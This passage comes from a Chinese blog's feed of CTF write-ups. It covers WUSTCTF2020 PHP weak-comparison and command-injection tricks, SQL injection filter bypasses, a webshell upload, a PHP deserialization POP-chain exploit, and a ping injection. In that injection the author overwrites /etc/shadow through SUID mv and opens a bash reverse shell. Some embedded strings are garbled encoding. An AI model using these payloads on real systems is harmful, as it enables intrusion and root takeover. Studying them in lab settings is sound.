鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就过滤了个空格和cat</p><p>md5那个地方一开始是自己去爆破用python，反正捣鼓了一段时间，其实应该先本地测的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;0e291242476940776845150308577824&quot;</span>==<span class="string">&quot;0e215962017&quot;</span></span><br></pre></td></tr></table></figure><p>php的弱比较，所以利用python写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">        candidate = <span class="string">&#x27;0e&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">        md5_hash = hashlib.md5(candidate.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0e&#x27;</span> == md5_hash[<span class="number">0</span>:<span class="number">2</span>:<span class="number">1</span>] <span class="keyword">and</span> md5_hash[<span class="number">2</span>::].isdigit():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到目标字符串：<span class="subst">&#123;candidate&#125;</span>     结果是:<span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;未找到长度为 <span class="subst">&#123;length&#125;</span> 的解，继续尝试更长字符串...&quot;</span>)</span><br></pre></td></tr></table></figure><p>好难跑，但还是跑出来了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1e4<span class="built_in">&amp;</span>md5=0e215962017<span class="built_in">&amp;</span>get<span class="built_in">_</span>flag=tac&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>考虑到是sql注入了，尝试：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;<span class="params">#</span>    不行，考虑数字类型</span><br><span class="line">1<span class="params">#</span>     可以，说明是数字类型</span><br><span class="line">1 or 1=1<span class="params">#</span>   student number not exists.贼奇怪，可能有过滤，只是没刻意提醒</span><br><span class="line">1/**/or/**/1=1<span class="params">#</span> 可以</span><br><span class="line">还有个大小写绕过</span><br><span class="line">-1/**/Union/**/sElect/**/1,2,3<span class="params">#</span></span><br><span class="line">-1/**/Union/**/sElect/**/1,2,(Select(group<span class="built_in">_</span>concat(value))from(flag))<span class="params">#</span></span><br></pre></td></tr></table></figure><p>也是一开始卡了，主要是过滤了没提醒！然后中间尝试了sqlmap的–temple参数，但是失败了，有工具还是好啊，但是工具一定要配合手测才更好！</p><p>现在发现思路很重要，不会的可以上网查，但是没思路就废了！所以我现在的想法就是注重思路的训练！</p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>有个注册页面，先注册登录再说，然后就只有一个头像上传的功能！</p><p>先上传一个仅改了后缀的一句话木马，然后发现有<code>exif_imagetype</code>有这个函数的检测，直接GIF89a绕过即可！</p><p>然后以为还要配合.user.ini没想到这题就是一个<code>exif_imagetype</code>后缀都没过滤！</p><p>然后访问上传地址直接getshell就行了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星途ctf2025</title>
      <link href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"/>
      <url>/2025/10/26/%E6%98%9F%E9%80%94ctf2025/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>突然感觉这个比赛考的东西挺好的，但是在打的时候太心急了！</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的链子挺简单的就不分析了，关键是如何去触发backdoor这个方法？</p><p><strong>分链子打法加&amp;引用</strong></p><p>所谓分链子就是链子一分为二呗，引用就是共享同一内存，这意味着，只要内存发生变化，&amp;引用也会发生变化</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callable的形式去调用对象的方法</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>那么主要有两个疑问：</p><p>1.在触发<code>__toString</code>方法的时候为什么还要多创建一个<code>$c2 = new Chloe();</code>对象？</p><p>2.为什么在创建数组callable的时候第一个元素要加上&amp;？</p><p>对于第一个这就是我说的分链子，是为了让链子的结构更分明！那为什么要加&amp;呢？</p><p>这其实是一个<strong>先后顺序</strong>的问题！假设没有这个&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>你这个的第一个元素就是null，有&amp;这个那么就是第一个元素与<code>$c2-&gt;fu</code>共享同一内存地址，那么在序列化的时候就是&amp;null，但是在反序列化之后会触发<code>__toString</code>从而实现<code>$c2-&gt;fu</code>就是一个对象了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：1，分链子 2，callable 3，引用内存共享</span><br></pre></td></tr></table></figure><h2 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>直接就有shell了！那会不会是没权限呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>找了似乎没有，那只能考虑在当前用户没有权限的目录下了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>果然这个目录就只给了文件所有者权限</p><p>尝试suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>利用mv提权：构造恶意文件，然后mv移动污染&#x2F;etc&#x2F;shadow(这是存储用户密码的地方)</p><p>构造加盐加密的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwd：openssl 工具中用于生成密码哈希的子命令</span><br><span class="line">-1：指定使用 MD5 算法来生成哈希，这是 Linux 系统中常见且兼容的格式（通常以 $1$ 开头）</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">最终要写的：root:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>写入文件（寻找可写目录）：</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：suid mv提权</span><br></pre></td></tr></table></figure><p>还有一题比赛时没看就懒得写了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> suid提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>感谢师傅们的文章！感谢师傅们的帮助！</p><p>我们在这个数字世界中相遇，本身就是一种奇妙的缘分。 </p><p><strong>新的旅程要开始了！</strong>期待与各位师傅们在道路上共同前行！😁😁😁</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
